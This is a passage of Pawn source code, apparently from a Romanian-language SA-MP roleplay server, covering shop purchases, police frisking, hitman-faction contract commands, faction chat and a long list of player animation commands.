			mysql_format(SQL, szQuery, sizeof(szQuery), "UPDATE users SET `ShowGlasses` = '%d', `Glasses`='%d' WHERE `ID` = '%d'", PlayerInfo[playerid][pShowGlasses], modelid, PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, szQuery, "", "");
		    new skin = PlayerInfo[playerid][pModel];
			SetPlayerHoldingObject(playerid, modelid, 2, SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
			BizzInfo[InInteriorID[playerid]][bBalance] += 500000;
			GivePlayerCash(playerid, -500000);
			SendClientMessage(playerid, COLOR_MONEY, "Ai cumparat o pereche de ochelari pentru $500.000.");
			SendClientMessage(playerid, -1, "Pentru a-ti scoate ochelarii de pe ochi, poti folosi comanda /removeglasses.");			
		}
		return true;
    }

    if(listid == skinlist)
    {
        if(response) {
			if(GetPlayerCash(playerid) < 10000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani!");
			if(!free_skin(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Ai prea multe skin-uri! Sterge din ele!");
			if(are_acest_skin(playerid, modelid)) return SendClientMessage(playerid, COLOR_GREY, "Ai deja un skin de acest fel!");
			give_skin(playerid, modelid);
			PlayerInfo[playerid][pModel] = modelid;
	        SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			BizzInfo[InInteriorID[playerid]][bBalance] += 10000;
	        GivePlayerCash(playerid, -10000);
	        UpdateVar(playerid, "Model", PlayerInfo[playerid][pModel]);
			if(PlayerInfo[playerid][pTutorial] == 3 && (GetPlayerSkin(playerid) != 250 || GetPlayerSkin(playerid) != 192)) {
				for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 4/5");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Felicitari! Ti-ai cumparat un nou skin.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ultimul pas pe care trebuie sa-l faci este de a-ti lua un job pentru a putea produce bani.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Poti alege orice job din lista (/jobs).");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Toate joburile sunt profitabile, nu exista un job cel mai bun.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Suma pe care o castigi este diferita in functie de skill, distanta si alte criterii pe care le poti vedea la tutorial de la job.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
				GameTextForPlayer(playerid, "Step: 4/5", 5000, 1);
				PlayerInfo[playerid][pTutorial] ++;
				UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
			}
		}
		return true;
    }	
	return true;
}
cmd:frisk(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist.");
	new id,string[128];
	if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/frisk <playerid/name>");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(!ProxDetectorS(8.0, playerid, id)) return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");
	if(id == playerid) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");
	new text1[20], text2[20], text4[20];
	if(PlayerInfo[id][pDrugs] > 0) { text1 = "| Droguri."; } else { text1 = "| Buzunar gol."; }
	if(PlayerInfo[id][pMats] > 0) { text2 = "| Materiale."; } else { text2 = "| Buzunar gol."; }
	if(PlayerInfo[id][pPhoneBook] > 0) { text4 = "| Phone Book."; } else { text4 = "| Buzunar gol."; }
	format(string, sizeof(string), "** Lucrurile lui %s{FFFFFF} **", GetName(id));
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "%s, grame de droguri: %d", text1,PlayerInfo[id][pDrugs]);
	SendClientMessage(playerid, 0xFFFFFFAA, string);
	format(string, sizeof(string), "%s, materiale: %d", text2,PlayerInfo[id][pMats]);
	SendClientMessage(playerid, 0xFFFFFFAA, string);
	format(string, sizeof(string), "%s.", text4);
	SendClientMessage(playerid, 0xFFFFFFAA, string);
	new Player_Weapons[13], Player_Ammos[13], i;
	for(i = 1;i <= 12;i++) {
		GetPlayerWeaponData(id,i,Player_Weapons[i],Player_Ammos[i]);
		if(Player_Weapons[i] != 0) {
			new weaponName[180];
			GetWeaponName(Player_Weapons[i],weaponName,255);
			format(string,255,"* %s, Arma:{FFFFFF} %s, Gloanta:{FFFFFF} %d",GetName(id),weaponName,Player_Ammos[i]);
			SendClientMessage(playerid,0xFFFFFFAA,string);
		}
	}
	format(string, sizeof(string), "* %s l-a verificat pe %s pentru lucruri ilegale.", GetName(playerid) ,GetName(id));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE);
    return true;
}
cmd:contract(playerid, params[]) {
	if(DeelayCommand[playerid][20] > gettime()) return DeelayTime(playerid, 20);
    extract params -> new player:userID, money; else return SendUsageMsg(playerid, "contract [id] [money]");
	if(!IsPlayerConnected(userID)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!(5000 <= money <= 1000000)) return SendErrorMsg(playerid, "Poti pune un contract pe minim $50,000 sau maxim $1,000,000.");	
	if(GetPlayerCash(playerid) < money) return SendErrorMsg(playerid, "Nu ai aceasta suma de bani!");
	if(userID == playerid) return SendErrorMsg(playerid, "Nu poti pune un contract pe tine!");
	if(PlayerInfo[userID][pMember] == 11 || PlayerInfo[userID][pLeader] == 11) return SendErrorMsg(playerid, "Nu poti pune un contract pe un Hitman!");
	if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda deoarece faci parte din aceasta factiune.");
	if(PlayerInfo[userID][pAdmin] != 0) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe acel player!");
    
	HeadValue[userID] += money; DeelayCommand[playerid][20] = gettime()+30;
	GivePlayerCash(playerid, -money); CheckMission(playerid, 10); Iter_Add(servicePlayers<7>, userID);
	va_SendClientMessage(playerid, COLOR_WHITE, "Ai pus un contract pe %s pentru suma de $%s.", GetName(userID), FormatNumber(money));
	return SendFactionMessage(11, COLOR_LIGHTBLUE, "# Un nou contract este disponibil pentru suma de $%s.", FormatNumber(money));
}

cmd:contracts(playerid) {
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11) return SendErrorMsg(playerid, AdminOnly);
	if(Iter_Count(servicePlayers<7>)) return SendErrorMsg(playerid, "Momentan, nu sunt contracte.");
	
	SendClientMessage(playerid, COLOR_TEAL, "------------------- Contracte -------------------");
	va_SendClientMessage(playerid, -1, "Au fost gasite %d contracte!", Iter_Count(servicePlayers<7>));
	return SendClientMessage(playerid, COLOR_TEAL, "------------------- Contracte -------------------");
}

cmd:undercover(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11) return SendErrorMsg(playerid, AdminOnly);

	if(!GetPVarInt(playerid, "Undercover")) {
		if(!PlayerToPoint(100, playerid, -2162.3484,641.3492,1052.3750)) return SendErrorMsg(playerid, "Aceasta comanda se poate folosi doar in interiorul HQ-ului.");
	    foreach(new i: StreamedPlayer[playerid]) ShowPlayerNameTagForPlayer(i, playerid, false);
		SendTeamMessage(11, 0x2C6CBFFF, "HA Dispatch: Hitman %s (%d) este acum sub acoperire.", GetName(playerid), playerid);
	    SendClientMessage(playerid, COLOR_YELLOW, "Acum esti sub acoperire. Playerii nu iti mai vor vedea numele.");
		PlayerTextDrawShow(playerid, UndercoverTD);
		return SetPVarInt(playerid, "Undercover", 1);
	}
	else {
		foreach(new i : StreamedPlayer[playerid]) ShowPlayerNameTagForPlayer(i, playerid, true);
        SetPVarInt(playerid, "Undercover", 0);
        SendClientMessage(playerid, COLOR_YELLOW, "Acum nu mai esti sub acoperire.");
	    PlayerTextDrawHide(playerid, UndercoverTD);
	}
	return true;
}	

cmd:gethit(playerid) {
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11) return SendErrorMsg(playerid, "Nu esti Hitman!");
	if(!PlayerToPoint(100, playerid, -2162.3484,641.3492,1052.3750)) return SendErrorMsg(playerid, "Aceasta comanda se poate folosi doar in interiorul HQ-ului.");
	if(PlayerHit[playerid] != -1) return SendErrorMsg(playerid, "Ai deja un contract.");
	if(!Iter_Count(servicePlayers<7>)) return SendErrorMsg(playerid, "Momentan, nu sunt contracte.");

	new x = 0;
	foreach(new i : servicePlayers<7>) {
		format(gQuery, MAX_PLAYER_NAME + 10, "%s (%d)\n", GetName(i), i); strcat(gString, gQuery);
		SelectedPlayers[playerid][x] = i; x++;
	}

	format(gQuery, 60, "Contracts: %d", Iter_Count(servicePlayers<7>));
	return ShowPlayerDialog(playerid, DIALOG_GETHIT, DIALOG_STYLE_LIST, gQuery, gString, "Select", "Cancel");
}

cmd:leavehit(playerid) {
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11) return SendErrorMsg(playerid, "Nu esti Hitman!");
	if(PlayerHit[playerid] == -1) return SendErrorMsg(playerid, "Nu ai un contract.");

	SendFactionMessage(11, COLOR_LIGHTBLUE, "HA Dispatch: Hitman %s (%d) a anulat contractul sau.", GetName(playerid), playerid);
	Iter_Add(servicePlayers<7>, PlayerHit[playerid]); PlayerHit[playerid] = -1;
	return true;
}

cmd:mycontract(playerid) {
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11) return SendErrorMsg(playerid, "Nu esti Hitman!");
	if(PlayerHit[playerid] == -1) return SendErrorMsg(playerid, "Nu ai un contract.");
	return va_SendClientMessage(playerid, COLOR_SERVER, "Ai un contract pe %s(%d) pentru suma de $%s.", GetName(PlayerHit[playerid]), PlayerHit[playerid], FormatNumber(HeadValue[PlayerHit[playerid]]));
}

cmd:quitfaction(playerid) {
	if(!PlayerInfo[playerid][pMember] && !PlayerInfo[playerid][pLeader]) return true;
	if(PlayerInfo[playerid][pLeader] != 0) return SendErrorMsg(playerid, "Nu poti iesi din aceasta factiune deoarece esti lider!");
	return ShowPlayerDialog(playerid, DIALOG_QUITFACTION, DIALOG_STYLE_MSGBOX, "Server:", "Esti sigur ca vrei sa parasesti acesta factiune?\nDaca factiunea nu are lider, nu vei primi FP iar daca are vei primi 20 FP!", "Da", "Nu");
}

//de testat
cmd:blockfc(playerid) {
	if(PlayerInfo[playerid][pRank] < 6) return SendErrorMsg(playerid, AdminOnly);
    FactionChat[PlayerInfo[playerid][pMember]] = FactionChat[PlayerInfo[playerid][pMember]] ? 1 : 0;
	return SendFactionMessage(PlayerInfo[playerid][pMember], 0x0080FFFF, "%s", FactionChat[PlayerInfo[playerid][pMember]] == FactionChat[PlayerInfo[playerid][pMember]] ? "%s a activat chatul factiunii." : "%s a oprit chatul factiunii.", GetName(playerid));
}

cmd:f(playerid, params[]) {
	if(!PlayerInfo[playerid][pMember]&&!PlayerInfo[playerid][pLeader]&&!SpecFaction[playerid])
		return true;

	if(IsACop(playerid)&&!SpecFaction[playerid])
		return true;

	if(PlayerInfo[playerid][pMuted] == 1) 
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if(FactionChat[PlayerInfo[playerid][pMember]] == 1 && PlayerInfo[playerid][pRank] < 6 && PlayerInfo[playerid][pTester]==false && PlayerInfo[playerid][pResponsabil]==false) 
		return SendClientMessage(playerid, COLOR_GREY, "Chatul factiunii a fost oprit!");

	if(sscanf(params, "s[250]", params)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/f <text>");
	
	if(FaceReclama(params)) 
		return RemoveFunction(playerid, params), Reclama(playerid, params), 1;

	if(SpecFaction[playerid] != 0) {
		SendFactionMessage(SpecFaction[playerid], 0x0080FFFF, "* Admin %s: %s", GetName(playerid), params);
		ChatLog(playerid, "* Admin %s: %s", GetName(playerid), params);			
		return true;
	}		
	SendFactionMessage(PlayerInfo[playerid][pMember], PlayerInfo[playerid][pRank]<6?0x00b8e6FF:0x298ca9FF, "%s %s: %s", GetRankName(playerid), GetName(playerid), params);
	ChatLog(playerid, "%s %s: %s", GetRankName(playerid), GetName(playerid), params);	
	return true;
}
cmd:animlist(playerid, params[]) {
    SendClientMessage(playerid,COLOR_LGREEN,"Anim list:");
    SendClientMessage(playerid,COLOR_WHITE,"Lifejump, Robman, Exhaust, Carlock, Rcarjack1, Lcarjack1, Rcarjack2, Lcarjack2, Hoodfrisked;");
    SendClientMessage(playerid,COLOR_WHITE,"Lightcig, Tapcig, Bat, Lean, Clearanim, Dancing, Box, Lowthrow, Highthrow;");
    SendClientMessage(playerid,COLOR_WHITE,"Leftslap, Handsup, Fall, Fallback, Sup, Rap, Push, Akick, Lowbodypush;");
    SendClientMessage(playerid,COLOR_WHITE,"Spray, Headbutt, Pee, Koface, Kostomach, Kiss, Rollfall, Lay2, Hitch;");
    SendClientMessage(playerid,COLOR_WHITE,"Beach, Medic, Scratch, Sit, Drunk, Bomb, Getarrested, Laugh, Lookout;");
    SendClientMessage(playerid,COLOR_WHITE,"Aim, Crossarms, Lay, Hide, Vomit, Eating, Wave, Shouting, Chant;");
    SendClientMessage(playerid,COLOR_WHITE,"Frisked, Exhausted, Injured, Slapass, Deal, Dealstance, Crack, Wank, Gro;");
    SendClientMessage(playerid,COLOR_WHITE,"Sit, Chat, Fucku, Taichi, Knife, Basket, JumpWater.");
    return true;
}
cmd:carhand(playerid, params[]) {
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    ApplyAnimation(playerid,"CAR","Tap_hand",4.1,0,1,1 ,1,1);
	return true;
}
cmd:lifejump(playerid, params[]) {
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","EV_dive",4.0,0,1,1,1,0);
	return true;
}
cmd:robman(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:exhaust(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return true;
}
OnePlayAnim(playerid, const animlib[], const animname[], Float:Speed, looping, lockx, locky, lockz, lp) 
	return ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
cmd:rcarjack1(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"PED","CAR_pulloutL_LHS",4.0,0,0,0,0,0);
	return true;
}
cmd:lcarjack1(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"PED","CAR_pulloutL_RHS",4.0,0,0,0,0,0);
	return true;
}
cmd:rcarjack2(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"PED","CAR_pullout_LHS",4.0,0,0,0,0,0);
	return true;
}
cmd:lcarjack2(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"PED","CAR_pullout_RHS",4.0,0,0,0,0,0);
	return true;
}
cmd:hoodfrisked(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid,"POLICE","crm_drgbst_01",4.0,0,1,1,1,0);
	return true;
}
cmd:lightcig(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,0);
	return true;
}
cmd:tapcig(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"SMOKING","M_smk_tap",3.0,0,0,0,0,0);
	return true;
}
cmd:bat(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid,"BASEBALL","Bat_IDLE",4.0,1,1,1,1,0);
	return true;
}

cmd:lean(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/lean <1-2>");
    switch (test)
    {
	    case 1: LoopingAnim(playerid,"GANGS","leanIDLE",4.0,0,1,1,1,0);
	    case 2: LoopingAnim(playerid,"MISC","Plyrlean_loop",4.0,0,1,1,1,0);
	    default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/lean <1-2>");
	}
	return true;
}
cmd:clearanim(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:dancing(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/dancing <1-7>");
	switch (test)
   	{
	    case 1: LoopingAnim(playerid,"STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1 );
        case 2: LoopingAnim(playerid,"STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1 );
     	case 3: LoopingAnim(playerid,"STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1 );
    	case 4: LoopingAnim(playerid,"STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1 );
    	case 5: LoopingAnim(playerid,"STRIP", "strip_E", 4.1, 1, 1, 1, 1, 1 );
    	case 6: LoopingAnim(playerid,"STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1 );
     	case 7: LoopingAnim(playerid,"STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1 );
     	default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/dancing <1-7>");
	}
	return true;
}
cmd:box(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,0);
	return true;
}
cmd:lowthrow(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"GRENADE","WEAPON_throwu",3.0,0,0,0,0,0);
	return true;
}
cmd:highthrow(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"GRENADE","WEAPON_throw",4.0,0,0,0,0,0);
	return true;
}
cmd:leftslap(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"PED","BIKE_elbowL",4.0,0,0,0,0,0);
	return true;
}
cmd:handsup(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	if(Freezed[playerid] == 1) return true;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	return true;
}
cmd:fall(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	LoopingAnim(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0);
	return true;
}
cmd:fallback(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "PED","FLOOR_hit_f", 4.0, 1, 0, 0, 0, 0);
    return true;
}
cmd:laugh(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:lookout(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    OnePlayAnim(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:aim(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:crossarms(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);
	return true;
}
cmd:lay(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:hide(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:vomit(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:wave(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:shouting(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"RIOT","RIOT_shout",4.0,1,0,0,0,0);
	return true;
}
cmd:chant(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"RIOT","RIOT_CHANT",4.0,1,1,1,1,0);
	return true;
}
cmd:frisked(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"POLICE","crm_drgbst_01",4.0,0,1,1,1,0);
	return true;
}
cmd:exhausted(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return true;
}
cmd:injured(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:slapass(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    OnePlayAnim(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:deal(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    OnePlayAnim(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0);
	return true;
}
cmd:dealstance(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
	return true;
}
cmd:crack(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:wank(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    LoopingAnim(playerid,"PAULNMAC", "wank_loop", 1.800001, 1, 0, 0, 1, 600);
	return true;
}
cmd:salute(playerid, params[]) {
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
    ApplyAnimation(playerid, "ON_LOOKERS", "Pointup_loop", 4.0, 1, 0, 0, 0, 0, 1);
    return true;
}
cmd:gro(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	LoopingAnim(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0);
	return true;
}
cmd:sup(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/sup <1-3>");
	switch (test)
  	{
    	case 1: OnePlayAnim(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0);
     	case 2: OnePlayAnim(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0);
     	case 3: OnePlayAnim(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0);
    	default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/sup <1-3>");
	}
    return true;
}
cmd:rap(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/rap <1-4>");
	switch (test)
	{
	    case 1: LoopingAnim(playerid,"RAPPING","RAP_A_Loop",4.0,1,0,0,0,0);
    	case 2: LoopingAnim(playerid,"RAPPING","RAP_C_Loop",4.0,1,0,0,0,0);
    	case 3: LoopingAnim(playerid,"GANGS","prtial_gngtlkD",4.0,1,0,0,0,0);
     	case 4: LoopingAnim(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,1,1);
    	default: SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/rap <1-4>");
	}
    return true;
}
cmd:push(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
 	OnePlayAnim(playerid,"GANGS","shake_cara",4.0,0,0,0,0,0);
	return true;
}
cmd:akick(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi animatii in timp ce esti intr-un vehicul.");
	OnePlayAnim(playerid,"POLICE","Door_Kick",4.0,0,0,0,0,0);
	return true;
}
cmd:lowbodypush(playerid, params[]) {
